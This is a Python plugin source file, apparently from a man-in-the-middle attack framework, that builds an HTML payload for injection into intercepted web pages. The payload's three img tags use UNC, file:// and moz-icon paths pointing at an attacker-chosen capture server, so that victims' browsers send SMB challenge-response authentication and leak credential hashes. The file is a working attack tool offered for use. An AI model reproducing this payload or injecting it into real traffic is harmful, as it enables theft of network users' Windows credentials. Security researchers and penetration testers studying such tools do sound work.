#!/usr/bin/env python2.7

# Copyright (c) 2014-2016 Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

from plugins.plugin import Plugin
from plugins.Inject import Inject
import sys
import logging

class SMBAuth(Inject, Plugin):
    name     = "SMBAuth"
    optname  = "smbauth"
    desc     = "Evoke SMB challenge-response auth attempts"
    depends  = ["Inject"]
    version  = "0.1"
    has_opts = True

    def initialize(self, options):
        Inject.initialize(self, options)
        self.target_ip = options.host

        if not self.target_ip:
            self.target_ip = options.ip_address
        
        self.html_payload = self._get_data()

    def add_options(self, options):
        options.add_argument("--host", type=str, default=None, help="The ip address of your capture server [default: interface IP]")

    def _get_data(self):
        return '<img src=\"\\\\%s\\image.jpg\">'\
                '<img src=\"file://///%s\\image.jpg\">'\
                '<img src=\"moz-icon:file:///%%5c/%s\\image.jpg\">' % tuple([self.target_ip]*3)
